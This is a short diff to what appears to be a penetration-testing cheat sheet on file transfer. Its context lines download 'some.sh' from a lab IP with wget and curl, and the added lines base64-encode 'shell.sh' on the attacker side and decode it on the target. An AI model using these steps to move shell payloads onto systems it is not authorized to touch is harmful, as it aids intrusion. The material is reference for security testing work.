@@ -168,3 +168,8 @@ wget http://10.10.10.10:8000/some.sh
 
 curl -o some.sh http://10.10.10.10:8000/some.sh
 ```
+via base64:
+```
+cat shell.sh | base64 -w 0   # On attacker
+echo <base64encoded> | base64 -d > shell.sh   # On target
+```
